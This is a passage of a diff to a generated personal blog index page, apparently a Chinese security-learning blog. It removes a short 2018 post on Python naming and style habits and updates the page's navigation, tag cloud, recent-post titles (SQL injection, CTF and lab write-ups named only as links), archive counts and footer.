-      <a class="article-title" href="/2018/04/16/python-in-practice/">关于python的一点实践</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <p>最开始写python，还是14年的时候开始。</p>
-<p>很长一段时间里，都是写十几句的脚本。写一行代码，要百度三五次。一来是写的少，另一来是基础也就那样。不懂还不知道学习。<br>那个时候还在python challenge装逼。</p>
-<p>最近在还是在写脚本，也没有写很多的东西，三五个文件，几百行代码。想把代码组织的清晰，就要有原则。</p>
-<p>总结几条实践：</p>
-<ul>
-<li>命名是一个大问题，自己写的时候已经很注意了，然而还是有很多脸红的地方。<ul>
-<li>函数使用小写 下划线分割</li>
-<li>类名使用首字母大写的驼峰方式</li>
-<li>文件名也要使用描述性的词汇，不要与使用的类库同名</li>
-<li>注意使用空行 类后两行分割 </li>
-<li>默认参数中间的空格</li>
-</ul>
-</li>
-<li>关于编程风格这一点，还是要多多琢磨pycharm的提示。消除提示的过程就是一个学习的过程。</li>
-<li>import的机制还需要进一步加强理解</li>
-<li>马上把廖雪峰的python3教程看一遍，熟悉一些用法，来改进不优雅的地方。</li>
-</ul>
-<p>既然在做着这个事情，就奋力打铁啊。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/04/16/python-in-practice/" data-id="cjnynvper000myax7aovr0a3c" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/28/picture-trojan-and-parsing-vuln/" data-id="cjqenkuov000p9wx7l4b7jzbg" class="article-share-link">Share</a>
       
       
       
@@ -630,7 +574,7 @@ isinstance([], Iterable)
 
 
   <nav id="page-nav">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页&raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next&raquo;</a>
   </nav>
 </section>
            
@@ -666,37 +610,37 @@ isinstance([], Iterable)
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title tagcloud">标签云</h3>
+    <h3 class="widget-title tagcloud">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/dedecms-漏洞复现/" style="font-size: 14px;">dedecms 漏洞复现</a> <a href="/tags/python-技术/" style="font-size: 14px;">python 技术</a> <a href="/tags/安全/" style="font-size: 14px;">安全</a> <a href="/tags/工具/" style="font-size: 14px;">工具</a> <a href="/tags/读书笔记/" style="font-size: 14px;">读书笔记</a> <a href="/tags/靶场学习-漏洞复现/" style="font-size: 14px;">靶场学习 漏洞复现</a>
+      <a href="/tags/python-技术/" style="font-size: 14px;">python 技术</a> <a href="/tags/安全/" style="font-size: 14px;">安全</a> <a href="/tags/工具/" style="font-size: 14px;">工具</a> <a href="/tags/漏洞复现/" style="font-size: 25px;">漏洞复现</a> <a href="/tags/编程/" style="font-size: 14px;">编程</a> <a href="/tags/读书笔记/" style="font-size: 14px;">读书笔记</a> <a href="/tags/靶场/" style="font-size: 25px;">靶场</a>
     </div>
   </div>
 
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title recent-posts">最新文章</h3>
+    <h3 class="widget-title recent-posts">Recent Posts</h3>
     <div class="widget">
       <ul>
         
           <li>
-            <a href="/2018/10/31/book-list/">book_list</a>
+            <a href="/2019/01/02/mybatis常见sql注入/">mybatis常见sql注入</a>
           </li>
         
           <li>
-            <a href="/2018/10/31/11-python-secuity-fun/">11招玩转网络安全</a>
+            <a href="/2018/11/30/windows系统配置nginx-php/">windows系统配置nginx+php</a>
           </li>
         
           <li>
-            <a href="/2018/10/30/upload-labs/">upload-labs实验</a>
+            <a href="/2018/11/14/zvuldrill靶场/">zvuldrill靶场</a>
           </li>
         
           <li>
-            <a href="/2018/10/28/picture-trojan-and-parsing-vuln/">picture-trojan-and-parsing-vuln</a>
+            <a href="/2018/11/13/shadowsocks-ios-compile/">ios翻墙客户端</a>
           </li>
         
           <li>
-            <a href="/2018/10/28/windows-php-file-upload-1/">windows-php-file-uoload_1</a>
+            <a href="/2018/11/12/shiyanbar-ctf-web/">shiyanbar_ctf_web</a>
           </li>
         
       </ul>
@@ -706,9 +650,9 @@ isinstance([], Iterable)
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title archive">归档</h3>
+    <h3 class="widget-title archive">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">2</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">2</span></li></ul>
     </div>
   </div>
 
@@ -747,11 +691,11 @@ isinstance([], Iterable)
   
   <div class="outer">
     <div id="footer-left">
-      &copy; 2014 - 2018 Fire Xun&nbsp;|&nbsp;
-      主题 <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
+      &copy; 2014 - 2019 Fire Xun&nbsp;|&nbsp;
+      Theme by <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
     </div>
      <div id="footer-right">
-      联系方式&nbsp;|&nbsp;xundidi@gmail.com
+      Contact&nbsp;|&nbsp;xundidi@gmail.com
     </div>
   </div>
 </footer>
